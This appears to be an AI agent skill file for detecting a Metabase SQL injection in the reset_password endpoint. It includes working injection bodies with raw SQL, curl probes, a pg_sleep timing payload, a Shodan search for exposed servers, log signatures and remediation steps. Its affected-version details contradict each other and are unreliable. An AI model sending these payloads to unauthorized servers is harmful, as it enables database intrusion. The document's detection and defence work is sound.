---
name: metabase-sqli-detect
description: "Detect Metabase SQLi via reset_password user-id key."
version: 1.0.0
author: spring
license: MIT
platforms: [linux, macos]
metadata:
  hermes:
    tags: [metabase, sqli, cve, security, detection, shodan, honeySQL, clojure]
    related_skills: [hermes-security-orchestration, site-recon, tempest]
---

# Metabase SQLi Detection (CVE unassigned — active exploitation)

Detect, verify, and triage the actively-exploited Metabase SQL injection.
Zero-day at disclosure (no CVE number); public PoC released 10 Aug 2026 noon UTC.

## When to use

- User asks about Metabase vulnerability, "Metabase SQLi", reset_password exploit
- Scanning/hunting self-hosted Metabase instances (Shodan, own inventory, logs)
- Incident response: suspicious `POST /api/session/reset_password` in web/application logs

## Vulnerability facts (memorize)

| Field | Value |
|---|---|
| Endpoint | `POST /api/session/reset_password` |
| Affected | Metabase v1.58.x below **v0.58.24** (introduced by `auth_identity` refactor) |
| Fixed | **v0.58.24** |
| PoC public | 10 Aug 2026 noon UTC |
| Exposure | ~2,500 Shodan-visible; ~13% cloud envs run self-hosted MB, ~25% of those internet-exposed (Wiz) |
| Impact | Unauthenticated **arbitrary blind SQLi** against H2 / PostgreSQL / MySQL / MariaDB |

Attack body — extra `user-id` key (not a documented field):
```json
{"token":"x","password":"y","user-id":{"raw":"INJECTED SQL"}}
```

Root cause (two bugs composing):
1. Clojure `merge` does NOT strip extra keys → `user-id` survives into query params
2. HoneySQL `:raw` directive embeds literal SQL without parameterization

## Workflow

### 1. Version check (fast triage)

```bash
curl -sS -m 15 https://TARGET/api/session/properties | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('version:', d.get('version', {}).get('tag') or d.get('version'))
"
```

- Versions below `v0.58.24` in the 1.58.x line → **VULNERABLE**
- `v0.58.24+` → patched (check again; version string can be masked)

### 2. Behavioral probe (blind SQLi, non-destructive)

The endpoint expects a valid token normally; the reliable signal is HOW the app
responds to a malformed `user-id` key vs. a normal request. Compare:

```bash
# Baseline: POST without user-id (expect 4xx validation error, NOT 500 with SQL trace)
curl -sS -m 15 -o /dev/null -w "%{http_code}\n" \
  -X POST https://TARGET/api/session/reset_password \
  -H "Content-Type: application/json" \
  -d '{"token":"x","password":"y"}'

# Probe: POST with user-id raw directive (expect ERROR / 500 / timing change if vulnerable)
curl -sS -m 20 -X POST https://TARGET/api/session/reset_password \
  -H "Content-Type: application/json" \
  -d '{"token":"x","password":"y","user-id":{"raw":"1"}}' \
  -w "\nHTTP %{http_code}\n"
```

A vulnerable instance frequently returns a **500 / error containing SQL fragments**
or a **measurably different response** when `user-id` is present. A patched instance
ignores the extra key and behaves identically to the baseline.

Blind/time-based confirmation (only on authorized targets):
```sql
{"token":"x","password":"y","user-id":{"raw":"1 AND (SELECT pg_sleep(3))"}}
```
Measure response delta vs baseline; >2s delta on PostgreSQL backend = confirmed.

### 3. Log / artifact hunt (detection opportunity)

Signature: `POST /api/session/reset_password` with JSON body containing `"user-id"`.

```bash
# Access log pattern (nginx/apache)
grep -iE 'POST /api/session/reset_password' /var/log/nginx/access.log | head -50

# Application logs (Metabase writes SQL errors to logs when :raw breaks the query)
grep -iE 'reset_password|user-id|honeysql|sql' /var/log/metabase/*.log 2>/dev/null | tail -50

# Then inspect the BODY of matching POSTs (access logs usually lack body → need
# app-level logging or a WAF/proxy that captures request bodies)
```

`"user-id"` in a reset_password body is **anomalous by design** — it is not a
documented parameter. Any appearance = exploitation attempt (successful or not).

### 4. Shodan / internet exposure triage

```bash
# Shodan CLI (if available) — inetnum / http.title:"Metabase" / port 3000
shodan search 'http.title:"Metabase"' --fields ip_str,port,http.title,version 2>/dev/null | head -50
```

Common default port: **3000** (also 443 behind reverse proxies).
Be careful: ~2,500 instances visible; only probe targets you are authorized to test.

## Pitfalls

1. **Version string can mislead** — `/api/session/properties` may be blocked or the version hidden; behavioral probe + log hunt are stronger evidence.
2. **Auth bypass ≠ data exfil instantly** — blind SQLi first; do not expect a direct UNION-based dump without adaptation per backend (H2 vs PG vs MySQL syntax differs).
3. **Do not run destructive probes** on targets you don't own — sleeping/time-based payloads on production DBs can cause load. Scope-controlled testing only (see `hermes-security-orchestration`).
4. **Docker deployments** commonly expose port 3000 with H2 embedded DB — highest risk profile (file-based DB, no network auth).
5. The `user-id` extra key is the **detection gold standard** — even failed exploitation leaves the signature in logs. Prioritize log review over live probing when you just need to confirm compromise.
6. Fixed version is `v0.58.24` — note the unusual version jump (paper says "fix landed in v0.58.24" while affected starts at "v1.58"; verify against the actual instance, don't assume a linear version line).

## Remediation checklist (for owners)

1. Upgrade to `v0.58.24` or later immediately
2. Do not leave self-hosted Metabase fully internet-exposed; restrict `/api/session/*` behind auth proxy/WAF if possible
3. Add log alert rule: `POST /api/session/reset_password` AND body contains `user-id`
4. If exploitation suspected: rotate DB credentials, check for new admin users, review Metabase users + password reset activity

## Related

- `hermes-security-orchestration` — scope-controlled security missions
- `site-recon` — map a target's stack before probing
- `tempest` — authorized offensive security missions (if user authorizes exploitation)